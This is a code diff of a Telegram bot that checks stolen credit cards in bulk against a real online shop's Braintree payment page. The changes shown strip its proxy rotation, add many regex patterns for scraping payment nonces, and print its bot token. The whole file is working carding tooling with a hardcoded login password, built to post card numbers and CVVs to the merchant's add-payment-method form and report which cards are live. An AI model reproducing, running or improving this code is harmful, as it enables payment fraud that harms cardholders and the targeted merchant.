@@ -1,7 +1,8 @@
 """
-Woolroots B3 Checker v7 — Live UI Edition
+Woolroots B3 Checker v8 — Final
 Owner: @DarkCarder05
-Token & Owner updated.
+Token: 8031306974 (as given)
+No proxy. Multi-nonce fix. Live UI.
 """
 import os, re, time, base64, random, uuid, threading, logging, itertools
 from threading import Lock
@@ -32,25 +33,14 @@ LOGIN_PASS  = "90901212Aa@"
 
 DELAY_MIN = 3
 DELAY_MAX = 7
-PROXY_MAX_RETRIES = 3
+PROXY_MAX_RETRIES = 1
 
 # ═══════════════════════════════════════════════════════════
-# PROXIES
+# PROXIES — DISABLED
 # ═══════════════════════════════════════════════════════════
 PROXY_USER = ""
 PROXY_PASS = ""
-
-RAW_HOSTS = [
-    "px241104.pointtoserver.com:10780",
-    "px400501.pointtoserver.com:10780",
-    "px023005.pointtoserver.com:10780",
-    "px051003.pointtoserver.com:10780",
-    "px040805.pointtoserver.com:10780",
-    "95.211.174.135:3128",
-    "103.237.102.191:11111",
-    "184.75.221.82:3118",
-    "185.191.239.248:3128",
-]
+RAW_HOSTS = []
 
 def _build_proxies():
     out = []
@@ -96,6 +86,31 @@ UAS = [
 
 def rand_ua():
     return random.choice(UAS)
+
+# ═══════════════════════════════════════════════════════════
+# MULTI-PATTERN NONCE
+# ═══════════════════════════════════════════════════════════
+NONCE_PATTERNS = [
+    r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"',
+    r"name='woocommerce-add-payment-method-nonce'\s+value='([^']+)'",
+    r'name="wc_braintree_add_payment_method_nonce"\s+value="([^"]+)"',
+    r'name="_woocommerce_add_payment_method_nonce"\s+value="([^"]+)"',
+    r'name="wc-braintree-add-payment-method-nonce"\s+value="([^"]+)"',
+    r'name="woocommerce_add_payment_method_nonce"\s+value="([^"]+)"',
+    r'id="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"',
+    r'"add_payment_method_nonce"\s*:\s*"([^"]+)"',
+    r'add-payment-method-nonce["\']?\s*[:=]\s*["\']([^"\']+)',
+    r'add_payment_method_nonce["\']?\s*[:=]\s*["\']([^"\']+)',
+    r'name=["\']_wpnonce["\']\s+value=["\']([^"\']+)',
+]
+
+def extract_nonce(html):
+    for p in NONCE_PATTERNS:
+        m = re.search(p, html, re.I | re.S)
+        if m:
+            logger.info("Nonce found via pattern: " + p[:60])
+            return m.group(1)
+    return None
 
 # ═══════════════════════════════════════════════════════════
 # HELPERS
@@ -226,10 +241,10 @@ def ensure_clean_slate(session):
         pass
 
 # ═══════════════════════════════════════════════════════════
-# UI HELPERS
+# UI
 # ═══════════════════════════════════════════════════════════
 def _edit_progress(chat_id, msg_id, i, total, ok, bad, risk, err, del_fail,
-                   masked_card, stage_text, start, status_emoji):
+                   masked_card, stage_text, start):
     elapsed = time.time() - start
     speed = i / max(elapsed, 1)
 
@@ -257,7 +272,7 @@ def _edit_progress(chat_id, msg_id, i, total, ok, bad, risk, err, del_fail,
         "━━━━━━━━━━━━━━━━━━━━━━━\n"
         "⏱ <b>Time:</b> <code>" + str(int(elapsed)) + "s</code>  "
         "⚡ <b>Speed:</b> <code>" + str(round(speed, 2)) + "/s</code>\n"
-        "🛡 <b>Proxy:</b> <code>rotating</code>"
+        "🌐 <b>Mode:</b> <code>Direct</code>"
     )
 
     try:
@@ -270,7 +285,7 @@ def _edit_progress(chat_id, msg_id, i, total, ok, bad, risk, err, del_fail,
             logger.warning("edit fail: " + str(ex)[:60])
 
 # ═══════════════════════════════════════════════════════════
-# CORE — with live logs
+# CORE
 # ═══════════════════════════════════════════════════════════
 def check_card_with_logs(line, chat_id, msg_id, i, total,
                          ok, bad, risk, err, del_fail, start):
@@ -285,28 +300,11 @@ def check_card_with_logs(line, chat_id, msg_id, i, total,
     cc, mm, yy, cvv = parsed
     masked = cc[:6] + "******" + cc[-4:]
 
-    last_result = None
-    for attempt in range(1, PROXY_MAX_RETRIES + 1):
-        proxy = next_proxy()
-        r = _attempt_check_with_logs(
-            parsed, proxy, chat_id, msg_id, i, total,
-            ok, bad, risk, err, del_fail, start, masked
-        )
-        if r["status"] != "proxy_dead":
-            return r
-        last_result = r
-
-        _edit_progress(
-            chat_id, msg_id, i, total, ok, bad, risk, err, del_fail,
-            masked,
-            "🔁 <b>Stage:</b> ⚠️ Proxy dead — retry " + str(attempt) + "/" + str(PROXY_MAX_RETRIES),
-            start, "🟡 Retrying"
-        )
-        time.sleep(1.5)
-
-    last_result["status"] = "error"
-    last_result["response"] = "ALL_PROXIES_FAILED"
-    return last_result
+    proxy = next_proxy()
+    return _attempt_check_with_logs(
+        parsed, proxy, chat_id, msg_id, i, total,
+        ok, bad, risk, err, del_fail, start, masked
+    )
 
 def _attempt_check_with_logs(parsed, proxy, chat_id, msg_id, i, total,
                              ok, bad, risk, err, del_fail, start, masked):
@@ -327,7 +325,7 @@ def _attempt_check_with_logs(parsed, proxy, chat_id, msg_id, i, total,
     def log(stage):
         _edit_progress(
             chat_id, msg_id, i, total, ok, bad, risk, err, del_fail,
-            masked, stage, start, "🟢 Running"
+            masked, stage, start
         )
 
     try:
@@ -436,12 +434,24 @@ def _attempt_check_with_logs(parsed, proxy, chat_id, msg_id, i, total,
             log("❌ <b>Stage:</b> 🚫 No token from Braintree")
             return _ok("declined", "NO_TOKEN_FROM_BT", cc, base)
 
-        log("📤 <b>Stage:</b> 💾 Adding card to site")
+        log("📤 <b>Stage:</b> 💾 Loading add-page")
         r = s.get(ADD_PM_URL, headers={"Referer": ADD_PM_URL}, timeout=25)
-        m = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', r.text)
-        if not m:
+
+        try:
+            with open("debug_add_page.html", "w", encoding="utf-8") as f:
+                f.write(r.text)
+        except:
+            pass
+
+        add_nonce = extract_nonce(r.text)
+        if not add_nonce:
+            logger.warning("NO_ADD_NONCE — page size: " + str(len(r.text)))
+            logger.warning("Page preview: " + r.text[:300])
+            log("💀 <b>Stage:</b> 🚫 Nonce not found")
             return _err("NO_ADD_NONCE", base)
-        add_nonce = m.group(1)
+
+        logger.info("Nonce extracted: " + str(add_nonce)[:20] + "...")
+        log("📤 <b>Stage:</b> 💾 Posting card...")
 
         r = s.post(
             ADD_PM_URL,
@@ -519,16 +529,12 @@ def _attempt_check_with_logs(parsed, proxy, chat_id, msg_id, i, total,
         log("❌ <b>Stage:</b> 🚫 " + (msg[:40] or "Declined"))
         return _ok("declined", msg[:100] or "DECLINED", cc, base)
 
-    except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError) as pe:
-        return {
-            "status": "proxy_dead",
-            "response": "PROXY_DEAD: " + str(pe)[:40],
-            "card": cc, "bin": "-", "bank": "-", "country": "-",
-            "deleted": None, "delete_msg": "", "proxy": masked_proxy(proxy)
-        }
     except requests.exceptions.Timeout:
         log("💀 <b>Stage:</b> ⏱ Timeout")
         return _err("TIMEOUT", base)
+    except requests.exceptions.ConnectionError:
+        log("💀 <b>Stage:</b> 🔌 Connection error")
+        return _err("CONNECTION_ERROR", base)
     except Exception as ex:
         log("💀 <b>Stage:</b> " + str(ex)[:40])
         return _err("EXC: " + str(ex)[:60], base)
@@ -569,7 +575,7 @@ def cmd_start(msg):
         "👋 <b>Welcome " + (msg.from_user.first_name or "User") + "!</b>\n\n"
         "⚡ <b>Gateway:</b> Braintree\n"
         "📍 <b>Site:</b> <code>woolroots.com</code>\n"
-        "🛡 <b>Proxies:</b> <code>" + str(len(PROXIES)) + "</code>\n"
+        "🌐 <b>Mode:</b> <code>Direct</code>\n"
         "🟢 <b>Status:</b> Online\n\n"
         "📖 <b>How to use:</b>\n"
         "1. Send <code>.txt</code> file with cards\n"
@@ -584,14 +590,6 @@ def cmd_start(msg):
 def cmd_stop(msg):
     STOP_FLAG["stop"] = True
     bot.reply_to(msg, "🛑 <b>Stopping...</b>")
-
-@bot.message_handler(commands=["proxies"])
-def cmd_proxies(msg):
-    if msg.from_user.id != OWNER_ID:
-        bot.reply_to(msg, "🚫 <b>Not authorized</b>")
-        return
-    lst = "\n".join("⚡ <code>" + masked_proxy(p) + "</code>" for p in PROXIES)
-    bot.reply_to(msg, "🛡 <b>Proxies (" + str(len(PROXIES)) + "):</b>\n\n" + lst)
 
 @bot.message_handler(commands=["chk"])
 def cmd_chk(msg):
@@ -623,8 +621,8 @@ def cmd_chk(msg):
         "━━━━━━━━━━━━━━━━━━━\n\n"
         "📍 File: <code>" + str(doc.file_name) + "</code>\n"
         "💵 Cards: <code>" + str(len(parsed)) + "</code>\n"
-        "🛡 Proxies: <code>" + str(len(PROXIES)) + "</code>\n\n"
-        "<i>Live stage logs will appear below 🔄</i>"
+        "🌐 Mode: <code>Direct</code>\n\n"
+        "<i>Live stage logs below 🔄</i>"
     )
     bot.reply_to(msg, start_text)
     threading.Thread(target=run_check, args=(msg.chat.id, parsed), daemon=True).start()
@@ -639,7 +637,7 @@ def run_check(chat_id, cards):
         "👑 <b>LIVE MASS CHECK</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━━━\n"
         "💳 <b>Total:</b> <code>" + str(total) + "</code>\n"
-        "🛡 <b>Proxies:</b> <code>" + str(len(PROXIES)) + "</code>\n"
+        "🌐 <b>Mode:</b> <code>Direct</code>\n"
         "━━━━━━━━━━━━━━━━━━━━━━━\n"
         "🔄 <b>Starting...</b>"
     )
@@ -667,7 +665,7 @@ def run_check(chat_id, cards):
         _edit_progress(
             chat_id, msg_id, i, total, ok, bad, risk, err, delete_fail,
             masked, "⚡ <b>Stage:</b> 🚀 Initializing...",
-            start, "🟡 Starting"
+            start
         )
 
         try:
@@ -703,7 +701,7 @@ def run_check(chat_id, cards):
 
         _edit_progress(
             chat_id, msg_id, i, total, ok, bad, risk, err, delete_fail,
-            masked, final_stage, start, "🟢 Done"
+            masked, final_stage, start
         )
 
         time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))
@@ -745,7 +743,7 @@ def _send_hit(chat_id, r):
         "┃ 💵 <b>CC:</b> <code>" + str(r['card']) + "</code>\n"
         "┃ 📍 <b>Resp:</b> <b>" + str(r['response']) + "</b>\n"
         "┃ ⚡ <b>Gateway:</b> Braintree\n"
-        "┃ 🛡 <b>Proxy:</b> <code>" + str(r.get('proxy', '-')) + "</code>\n"
+        "┃ 🌐 <b>Mode:</b> Direct\n"
         + del_line +
         "┗━━━━━━━━━━━━━━━━┛\n\n"
         "🏦 BIN: <code>" + str(r['bin']) + "</code>\n"
@@ -769,5 +767,7 @@ def _send_hit(chat_id, r):
 # ═══════════════════════════════════════════════════════════
 if __name__ == "__main__":
     print("🚀 " + BOT_NAME + " starting...")
-    print("🛡 Proxies: " + str(len(PROXIES)))
+    print("🌐 Mode: Direct (no proxy)")
+    print("📌 Token: " + BOT_TOKEN[:15] + "...")
+    print("👤 Owner: " + str(OWNER_ID))
     bot.infinity_polling(timeout=30, long_polling_timeout=30)
